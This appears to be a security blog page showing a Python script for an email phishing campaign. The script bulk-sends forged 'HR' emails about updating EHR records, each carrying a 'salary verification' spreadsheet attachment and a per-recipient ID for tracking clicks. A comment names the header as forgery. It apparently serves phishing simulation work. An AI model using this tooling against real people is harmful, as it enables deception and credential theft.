<h3 id="2-sendemail-randomid"><a href="#2-sendemail-randomid" class="headerlink" title="2.sendemail-randomid"></a>2.sendemail-randomid</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> smtplib</span><br><span class="line"><span class="keyword">import</span> openpyxl   <span class="comment">#导入openpyxl模</span></span><br><span class="line"><span class="comment">#参考https://blog.csdn.net/weixin_35540389/article/details/113714867</span></span><br><span class="line"><span class="keyword">from</span> email.mime.text <span class="keyword">import</span> MIMEText</span><br><span class="line"><span class="keyword">from</span> email.mime.multipart <span class="keyword">import</span> MIMEMultipart</span><br><span class="line"><span class="keyword">from</span> email.header <span class="keyword">import</span> Header</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sendmail</span>(<span class="params">mail_toperson,randomid</span>):</span></span><br><span class="line">    mail_host = <span class="string">&quot;********&quot;</span></span><br><span class="line">    mail_sender = <span class="string">&quot;hr@********&quot;</span></span><br><span class="line">    mail_license = <span class="string">&quot;********&quot;</span></span><br><span class="line">    mail_receivers = mail_toperson</span><br><span class="line">    mm = MIMEMultipart(<span class="string">&#x27;related&#x27;</span>)</span><br><span class="line">    subject_content = <span class="string">&quot;&quot;&quot;您的EHR信息需要更新&quot;&quot;&quot;</span></span><br><span class="line">    mm[<span class="string">&quot;From&quot;</span>] = <span class="string">&quot;hr@********&quot;</span><span class="comment">#邮件伪造，隐藏账号所属分支</span></span><br><span class="line">    mm[<span class="string">&quot;To&quot;</span>] = mail_toperson<span class="comment">#改成用户名</span></span><br><span class="line">    mm[<span class="string">&quot;Subject&quot;</span>] = Header(subject_content, <span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    randomid= randomid<span class="comment">#引入randomid概念，在邮件中插入randomid，用于查询邮件发送状态对应的人员是否点击</span></span><br><span class="line">    body_content = <span class="string">&quot;&quot;&quot;放入邮件的html********&quot;&quot;&quot;</span>%(randomid)</span><br><span class="line">    message_text = MIMEText(body_content,<span class="string">&quot;html&quot;</span>,<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">    mm.attach(message_text)</span><br><span class="line">    filename = <span class="string">&quot;薪资情况核实.xlsx&quot;</span></span><br><span class="line">    att1 = MIMEText(<span class="built_in">open</span>(filename, <span class="string">&#x27;rb&#x27;</span>).read(), <span class="string">&#x27;base64&#x27;</span>, <span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    att1[<span class="string">&quot;Content-Type&quot;</span>] = <span class="string">&#x27;application/octet-stream&#x27;</span></span><br><span class="line">    <span class="comment"># 这里的filename可以任意写，写什么名字，邮件中显示什么名字</span></span><br><span class="line">    att1.add_header(<span class="string">&#x27;Content-Disposition&#x27;</span>, <span class="string">&#x27;attachment&#x27;</span>, filename=filename)</span><br><span class="line">    <span class="comment"># att1[&quot;Content-Disposition&quot;] = &#x27;attachment; filename=%s&#x27;%(filename)#无法中文</span></span><br><span class="line">    mm.attach(att1)<span class="comment">#增加附件内容</span></span><br><span class="line"></span><br><span class="line">    stp = smtplib.SMTP_SSL(host=mail_host)<span class="comment">#改为ssl</span></span><br><span class="line">    stp.connect(mail_host, <span class="number">465</span>)</span><br><span class="line">    stp.set_debuglevel(<span class="number">1</span>)</span><br><span class="line">    stp.login(mail_sender, mail_license)</span><br><span class="line">    stp.sendmail(mail_sender, mail_receivers, mm.as_string())</span><br><span class="line">    <span class="built_in">print</span>(mail_toperson+<span class="string">&quot;\t邮件发送成功,randomid:&quot;</span>+randomid)</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;sendmail.txt&#x27;</span>,<span class="string">&#x27;a&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(mail_toperson+<span class="string">&quot;\t邮件发送成功,randomid:&quot;</span>+randomid+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    stp.quit()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    wb = openpyxl.reader.excel.load_workbook(filename=<span class="string">r&#x27;*****.xlsx&#x27;</span>)  <span class="comment"># 打开excel文件</span></span><br><span class="line">    sheetnames = wb.get_sheet_names()</span><br><span class="line">    ws = wb.get_sheet_by_name(sheetnames[<span class="number">0</span>])</span><br><span class="line">    data_dic = &#123;&#125;</span><br><span class="line">    <span class="comment"># for rx in range(1, 3):#修改条数用于测试邮件</span></span><br><span class="line">    <span class="keyword">for</span> rx <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, ws.max_row + <span class="number">1</span>):  <span class="comment">#</span></span><br><span class="line">        temp_list = []</span><br><span class="line">        pid = rx</span><br><span class="line">        w1 = ws.cell(row=rx, column=<span class="number">1</span>).value</span><br><span class="line">        w2 = ws.cell(row=rx, column=<span class="number">2</span>).value</span><br><span class="line">        w3 = ws.cell(row=rx, column=<span class="number">3</span>).value</span><br><span class="line">        w4 = ws.cell(row=rx, column=<span class="number">4</span>).value</span><br><span class="line">        temp_list = [w1, w2, w3, w4]</span><br><span class="line">        mail_toperson = <span class="built_in">str</span>(temp_list[<span class="number">2</span>])</span><br><span class="line">        randomid = <span class="built_in">str</span>(temp_list[<span class="number">3</span>])</span><br><span class="line">        <span class="built_in">print</span>(mail_toperson + <span class="string">&#x27;\t&#x27;</span> + randomid)</span><br><span class="line">        <span class="comment">#sendmail(mail_toperson, randomid)</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            sendmail(mail_toperson,randomid)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>


      
    </div>
    
    <div class="article-info article-info-index">
      
      
	<div class="article-tag tagcloud">
		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Python/" rel="tag">Python</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91/" rel="tag">安全开发</a></li></ul>
	</div>

      

      
      <div class="clearfix"></div>
    </div>
      
    
  </div>
  
</article>







  
  
    <nav id="page-nav">
      <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="extend next" rel="next" href="/page/2/">Next &amp;raquo;</a>
    </nav>
  
</div>
      <footer id="footer">
  <div class="outer">
    <div id="footer-info">
      <div class="footer-left">
        &copy; 2024 z0edff0x3d
      </div>
        <div class="footer-right">
          <a href="http://hexo.io/" target="_blank">Hexo</a>  Theme <a href="https://github.com/preccrep/hexo-theme-jelly" target="_blank">Jelly</a>
        </div>
    </div>
  </div>
</footer>
    </div>
    
  
<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">



<script>
	var yiliaConfig = {
		fancybox: true,
		mathjax: false,
		animate: true,
		isHome: true,
		isPost: false,
		isArchive: false,
		isTag: false,
		isCategory: false,
		open_in_new: false
	}
</script>

<script src="/js/main.js"></script>




  </div>
</body>
</html>